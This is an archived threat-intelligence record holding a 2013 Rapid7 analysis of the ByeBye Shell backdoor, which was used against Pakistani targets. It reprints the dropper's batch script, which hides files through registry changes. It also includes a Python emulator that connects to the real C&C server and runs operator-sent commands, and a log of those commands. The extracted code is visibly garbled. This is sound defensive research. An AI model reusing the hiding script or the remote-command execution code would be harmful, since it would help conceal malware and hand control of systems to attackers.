{
    "id": "b371420f-2619-44ad-ba08-504ca7453e89",
    "created_at": "2022-10-25T16:48:24.727876Z",
    "updated_at": "2025-03-27T02:16:26.486325Z",
    "deleted_at": null,
    "sha1_hash": "2ca545418f9fefe1c4dd96feeeff256adbb97e6f",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-08-15T07:23:44Z",
    "file_modification_date": "2022-08-15T07:23:44Z",
    "file_size": 705986,
    "plain_text": "# ByeBye Shell and the targeting of Pakistan\n\n**[rapid7.com/blog/post/2013/08/19/byebye-and-the-targeting-of-pakistan](https://www.rapid7.com/blog/post/2013/08/19/byebye-and-the-targeting-of-pakistan/)**\n\n_Last updated at Thu, 24 Aug 2017 13:43:38 GMT_\n\n\nAugust 19, 2013\n\n\nAsia and South Asia are a theater for daily attacks and numerous ongoing espionage\ncampaigns between neighboring countries, so many campaigns that it's hard to keep\ncount. Recently I stumbled on yet another one, which appears to have been active since at\nleast the beginning of the year, and seems mostly directed at Pakistani targets.\n\nIn this article we're going to analyze the nature of the attacks, the functionality of the\nbackdoor - here labelled as ByeBye Shell - and the quick interaction I had with the\noperators behind this campaign.\n\n## Infection\n\nNo exploit was used in any of the attacks we attribute to this campaign - the attackers\nprobably just relied on social engineering the victim through well-crafted spearphishing\nemails.\n\nThe malware first appears to the victim as a .scr file. In some cases the attackers make use\nof the Left-to-Right Override Unicode character in order to twist the .exe file extension\ninto something more credible.\n\nOnce executed it drops and launches a batch script in a %Temp% subfolder with the\nfollowing content:\n```\n@ echo off\n\n@ start \"IEXPLORE.EXE\" \"<backdoor>\"\n\n@ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v\nHidden /t REG_DWORD /d 0x00000000 /f\n\n@ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v\nHideFileExt /t REG_DWORD /d 0x00000001 /f\n\n@ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v\nShowSuperHidden /t REG_DWORD /d 0x00000000 /f\n\n@ reg add\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOW\n /v CheckedValue /t REG_DWORD /d 0x00000000 /f\n\n@ exit\n\n\n```\nAs you can see, it enforces some configuration in the registry in order to hide file\nextensions and not show hidden folders.\n\n\n-----\n\nSubsequently the malware creates and launches a Cabinet Self-Extractor, which drops\ntwo additional executable files: one embedding either a PDF or a Microsoft Office Word\ndocument, the other being the actual backdoor.\n\nThese are the hashes of the original droppers I inspected during this analysis:\n\n8b4224dac114a9b8433913a1977f88b2\n\n469cf94c457c17d8f24dacf9f9d41f33\n\n6b349e439a17c4b66fb2a25965432aa9\n\nd36da5c48d8fb7ee8c736ae183bf3f8a\n\nThe embedded documents all show content revolving around internal or foreign\n**Pakistan politics - following are some examples of such documents:**\n\nThis document appears to report an article that appeared on Hilal, the magazine of the\nPakistan Armed Forces. You can find a copy of the original article on this Pakistan\ninstitutional website.\n\n\n-----\n\nAlso in this case the attacker seems to have just reused an existing article. Searching\nonline for the content, it appears to have been originally published on a website called\nSATribune, which is no longer online.\n\n[You can find a copy of the full article here.](http://www.paklinks.com/gs/world-affairs/89886-guess-which-country-is-a-rogue-state.html)\n\n\n-----\n\n[Again, the original article is available on Dawn.com.](http://dawn.com/news/1035449/punjabi-taliban-warn-of-reprisal-if-pml-n-govt-hangs-militants)\n\n\n-----\n\n[This last one coming instead from Reuters.](http://in.reuters.com/article/2013/07/09/pakistan-taliban-idINDEE9680FQ20130709)\n\n## Backdoor\n\nLet's face it: at the point where the attackers obtain control over the target computer, not\n**much sophistication is left in day-to-day targeted attacks. PoisonIvy, Gh0st and**\ncustom backdoors are daily business for threat analysts and malware researchers, in most\ncases being tedious work with little technical challenge.\n\nThis campaign is no exception. The main backdoor installed and executed on the victims'\nsystems appears to be a custom reverse shell with just a handful of features. Due to a lack\nof public literature about this case, I decided to dub this family as ByeByeShell.\n\nWhen disassembling the binary you can quickly understand the mechanics of the\nbackdoor. After some quick initialization, the backdoor XORs an embedded string with\n_0x9D to extract the IP address of the C&C server. Subsequently it establishes a connection_\nto it (generally on port 80) and checks in with some basic information about the system.\n\nLAB-OF-Me: 10.0.2.15............................................................UserName: User\n\n\n-----\n\nHostName:lab\n\nMAC:\n\nAddress 0: 10.0.2.15\n\n[P130813]\n\nAs you can see, it reports the computer name, the user name, the IP address and MAC\naddress of the network adapter. The [P130813] line appears to be a constant value,\npossibly a target identifier.\n\nInterestingly, in a specific malware sample belonging to this campaign, the backdoor also\nappends the string \"INS and AfPak\" at the end of the message - note that, as defined by\n[Wikipedia, \"_AfPak (or Af-Pak) is a neologism used within US foreign policy circles to](http://en.wikipedia.org/wiki/AfPak)\ndesignate Afghanistan and Pakistan as a single theater of operation_s\".\n\nAfter the check-in message is sent, the malware enters a continuous loop in which it will\nkeep silently waiting for commands from the open socket connection. From now on, it\nexpects some manual interaction from the attacker.\n\nThe supported commands are:\n\n**shell**\n**comd**\n**sleep**\n**quit**\n**kill**\n\nYou can see the switch block in the following screenshots.\n\n\n-----\n\nWhen a message is received from the socket connection, it checks if the message is\n**\"shell\" then spawn a reverse shell, otherwise continues by checking for \"comd\"**\n**which will simply execute a command and returns.**\n\n\n-----\n\nIf neither \"shell\" or \"comd\" is specified by the operator, it checks if it has been instructed\nto sleep or terminate, otherwise it just continues to the next iteration.\n\nIn the following screenshot you can see how the reverse shell is implemented: it just\n**launches a cmd.exe and pipes stdin, stdout and stderr to the opened socket so**\nthat the operator can directly interact with the Windows prompt.\n\n\n-----\n\nAs you can see, this is an extremely basic backdoor, even poorly written if you ask me.\nAntivirus detection rate is also reasonably good, despite consisting mostly of generic\nsignatures.\n\nThe samples are also signed with an invalid Microsoft Windows certificate, which can be\nused for further fingerprinting:\n\n\n-----\n\n```\nCertificate:\n\n  Data:\n\n    Version: 3 (0x2)\n\n    Serial Number:\n\n      5b:b2:39:83:49:9b:89:a0:43:a8:10:3a:67:24:13:78\n\n  Signature Algorithm: md5WithRSAEncryption\n\n    Issuer: CN=Microsoft Windows\n\n    Validity\n\n      Not Before: Dec 31 18:30:00 2011 GMT\n\n      Not After : Dec 31 18:30:00 2014 GMT\n\n    Subject: CN=Microsoft Windows\n\n    Subject Public Key Info:\n\n      Public Key Algorithm: rsaEncryption\n\n        Public-Key: (1024 bit)\n\n        Modulus:\n\n            00:c6:e9:0c:5e:0a:09:39:db:58:a8:03:6c:60:da:\n\n        32:ad:c5:3d:9a:39:91:ca:93:9f:ac:39:aa:3d:45:\n\n        54:a7:63:e0:a7:c3:b0:b6:ee:2b:6c:bd:83:f9:9b:\n\n        9b:e1:df:0d:e1:2a:96:e3:99:5e:52:0e:c7:c5:63:\n\n        91:b4:e9:37:63:be:4b:62:23:2e:b8:00:f0:48:22:\n\n        1e:ef:60:16:99:a4:08:2c:66:72:26:a2:68:1d:66:\n\n        a4:22:ff:a5:72:7a:ad:f8:78:9c:1f:2e:89:49:62:\n\n        f4:ba:6d:7f:f5:04:b1:9b:29:58:13:1d:f9:0f:a6:\n\n 86:95:95:92:0b:57:9c:ca:39\n\nExponent: 65537 (0x10001)\n\nX509v3 extensions:\n\n2.5.29.1:\n\n         0D..g.yY,.^.Oxz..../..0.1.0...U....Microsoft Windows..\n[.9.I...C..:g$.x   Signature Algorithm: md5WithRSAEncryption\n\n         bd:b3:b3:95:14:aa:55:0d:80:4a:7b:d5:54:e9:43:e9:e1:36:\n\n         c1:7b:25:64:4b:a4:35:6f:55:81:d1:f5:9d:69:87:04:f3:8d:\n\n         05:0a:49:31:0e:49:11:62:97:85:42:b4:37:63:ce:88:77:59:\n\n         44:9c:83:03:9c:bb:95:f8:f4:8d:15:b5:1c:96:d4:af:ea:50:\n\n         0a:cf:53:38:01:ed:00:6c:a0:90:f6:4c:8c:80:12:f3:ac:38:\n\n         b1:4f:d9:e9:d1:2b:8b:40:0e:9e:6b:38:45:a1:90:2d:fe:79:\n\n         92:6d:f8:98:f1:a7:bf:9b:8d:7a:bc:89:77:12:33:29:6e:7e:\n\n         d2:ff\n\n## Playing with the Attacker\n\n```\nIn all the cases presented in this blog post, the backdoors tried to connect to the C&C\nlocated at 46.165.207.134, which appears to be a dedicated server hosted by Leaseweb:\n\ninetnum:    46.165.200.0 - 46.165.207.255\n\nnetname:    NETDIRECT-NET\n\ndescr:     Leaseweb Germany GmbH (previously netdirekt e. K.)\n\nremarks:    INFRA-AW\n\ncountry:    DE\n\n\n-----\n\nadmin-c:    LSWG-RIPE\n\ntech-c:     LSWG-RIPE\n\nstatus:     ASSIGNED PA\n\nmnt-by:     NETDIRECT-MNT\n\nmnt-lower:   NETDIRECT-MNT\n\nmnt-routes:   NETDIRECT-MNT\n\nsource:     RIPE # Filtered\n\nAt the time of writing, the server appears to still be online. However port 80, which the\nbackdoors try to contact, appears to be available only sporadically. In order to get some\nfun out of an overall straightforward analysis, I quickly hacked together a Python script\n**that emulates a ByeBye backdoor - following is the code:**\n\n\n-----\n\n```\nimport os\n\nimport sys\n\nimport socket\n\nimport subprocess\n\ndef main(host='46.165.207.134'):\n\n  # This is the check-in message.\n\n  buf = \"HOMEPC-OF-User:\n192.168.0.5............................................................UserName:\nUser\\n\"\n\n  buf = \"HostName:HOMEPC\\n\"\n\n  buf = \"MAC: <MAC ADDRESS>\\n\"\n\n  buf = \"Address 0: 192.168.0.5\\n\"\n\n  buf = \"[P100713]\\n\"\n\n  buf = \"$\"\n\n  # Emulating cmd.exe, hacky but works.\n\n  cmd = \"Microsoft Windows XP [Version 5.1.2600]\\n\"\n\n  cmd = \"(C) Copyright 1985-2001 Microsoft Corp.\\n\"\n\n  prompt = \"C:\\Documents and Settings\\User> \"\n\n  print(\"[*] Trying to connect to C&C...\")\n\n  # Try to establish connection with the C&C.\n\n  while True:\n\n    try:\n\n      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n      sock.connect((host, 80))\n\n    except Exception as e:\n\n    print(\"[!] ERROR: Unable to connect: {0}\".format(e))\n\n    sock.close()\n\n    continue\n\n  else:\n\n    subprocess.Popen('start alarm.mp3', shell=True)\n\n    break\n\n  print(\"[*] Connected to C&C!\")\n\n  # Send check-in message.\n\n  sock.send(buf)\n\n  print(\"[*] Authenticated to C&C!\")\n\n  # This flag represents whether we should currently emulate a cmd.exe prompt\n\n  # or emulate the backdoor shell.\n\n  shell_mode = False\n\n  # Main loop.\n\n  while True:\n\n    # Wait for incoming command.\n\n    try:\n\n      bufin = sock.recv(1024)\n\n    except KeyboardInterrupt:\n\n      break\n\n     except Exception as e:\n\n```\n\n-----\n\n```\n      print(\"[!] ERROR: Connection lost: {0}\".format(e))\n\n      break\n\n    data = bufin.strip()\n\n    if len(data) == 0:\n\n      continue\n\n    print(\"[ ] Received: {0}\".format(data))\n\n    # If we are in cmd.exe mode...\n\n    if shell_mode:\n\n      # If he tries to exit the cmd, we emulate that.       if data in\n('quit', 'exit'):\n\n        shell_mode = False\n\n        sock.send('/pre>)\n\n        continue\n\n      # If he tries to shutdown the system, I'm gonna interrupt.\n\n      elif 'shutdown' in data:\n\n        break\n\n      # I don't want him to kill processes.\n\n      elif 'taskkill' in data:\n\n        continue\n\n      # Otherwise just execute the command.\n\n      else:\n\n        proc = subprocess.Popen(data, stdout=subprocess.PIPE,\nstderr=subprocess.PIPE, shell=True)\n\n        (out, err) = proc.communicate()\n\n        if out:\n\n          lines = out.split('\\n')\n\n          out_lines = []\n\n          for line in lines:\n\n            # Can filter output here, for instance remove process\n\n            # names or VirtualBox indicators and such.\n\n            out_lines.append(line)\n\n          # Send the findal cmd output.\n\n          sock.send('\\n'.join(out_lines))\n\n        if err:\n\n          sock.send(err)\n\n        sock.send(prompt)\n\n      else:\n\n        if data == 'kill':\n\n          # Should do this:\n\n          #sock.send('KILLED')\n\n          # But I'm disappointed:\n\n          sock.send('NOOooOOooOOooOOoo :-( I thought we were friends!')\n\n          break\n\n        elif data == 'shell':\n\n          sock.send(cmd)\n\n          sock.send(prompt)\n\n          shell_mode = True\n\n          continue\n\n          elif data == 'sleep':\n\n```\n\n-----\n\n```\n          sock.send('BYE BYE\\n')\n\n        sock.send('/pre>)\n\nif __name__ == '__main__':\n\n  if len(sys.argv) == 2:\n\n    main(sys.argv[1])\n\n  else:\n\n    main()\n\n```\nAs you can see, this script simply tries to emulate the basic functionality of ByeBye: it\nperforms the initial check-in and waits for incoming messages from the operator.\n\nYes - since, as previously said, the C&C comes online only at times - I instructed the script\nto play an extremely loud alarm. Props to my flatmate for waking me up whenever the\nalarm went off.\n\nSurprisingly the operator responded few moments later my first attempt, although he\n**quickly tried to terminate me probably noticing an unexpected origin:**\n\n[ ] Received: kill\n\n[ ] Received: kill\n\n[ ] Received: shell\n\n[ ] Received: shutdown /r /t 0\n\nUnfortunately at that time I didn't have the script completed, therefore he noticed\nsomething odd and closed my connection.\n\nI let a few days pass, completed the script and prepared a more credible scenario: a\nlegitimate looking system connecting out of South Asia. This time it took a bit longer to\nget some response from the operator, who simply tried to search for documents on\n**the system:**\n\n[ ] Received: shell\n\n[ ] Received: systeminfo\n\n[ ] Received: dir /s *.pdf\n\n[ ] Received: dir /s *.doc\n\n[ ] Received: exit\n\n[ ] Received: sleep\n\nSadly no further activity was observed.\n\n\n-----\n\n## Conclusions\n\nThis is yet another case of poorly skilled attackers managing to run successful espionage\ncampaigns for extended periods of time. This is probably one of the most basic incidents I\nencountered so far, but we can safely assume that the operators behind this campaign are\nsuccessful enough to maintain the operations running for at least the last 6 months,\npossibly even more.\n\nNo clear indicator is available to make an informed estimate on what could be the origin\nof the attacks.\n\n[This work was brought to you by Claudio \"nex\" Guarnieri, Rapid7 Labs.](http://twitter.com/botherder)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2012/2012.08.19.ByeBye_Shell/ByeBye%20Shell%20and%20the%20targeting%20of%20Pakistan.pdf"
    ],
    "report_names": [
        "ByeBye Shell and the targeting of Pakistan"
    ],
    "threat_actors": [
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1660548224,
    "ts_modification_date": 1660548224,
    "files": {
        "pdf": "https://archive.orkl.eu/2ca545418f9fefe1c4dd96feeeff256adbb97e6f.pdf",
        "text": "https://archive.orkl.eu/2ca545418f9fefe1c4dd96feeeff256adbb97e6f.txt",
        "img": "https://archive.orkl.eu/2ca545418f9fefe1c4dd96feeeff256adbb97e6f.jpg"
    }
}